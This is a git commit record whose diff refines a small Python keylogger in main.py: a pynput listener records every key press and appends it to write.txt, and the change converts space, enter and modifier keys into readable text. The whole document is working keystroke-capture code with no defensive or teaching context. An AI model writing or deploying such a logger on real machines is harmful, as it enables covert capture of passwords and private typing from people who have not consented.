30ecb7af9b29203e97b90f94580f0ffeab8fbb11
phu nov <phuephue1125@gmail.com>
2024-02-20 23:31:28 +0630

    keystrokes

--- main.py
+++ main.py
@@ -1,10 +1,22 @@
 from pynput.keyboard import Listener
     
-def writeofile(key):
+def write_to_file(key):
     letter=str(key)
     letter=letter.replace("'","")
+
+    if letter=='Key.space':
+        letter=' '
+    if letter=='Key.shift':
+        letter=''
+    if letter=='Key.enter':
+        letter='\n'
+    if letter=='Key.ctrl_l':
+        letter=''
+    if letter=='Key.backspace':
+        letter=''
+                    
     with open("write.txt","a") as f:
         f.write(letter)
 
-with Listener(on_press=writeofile) as l:
+with Listener(on_press=write_to_file) as l:
     l.join()
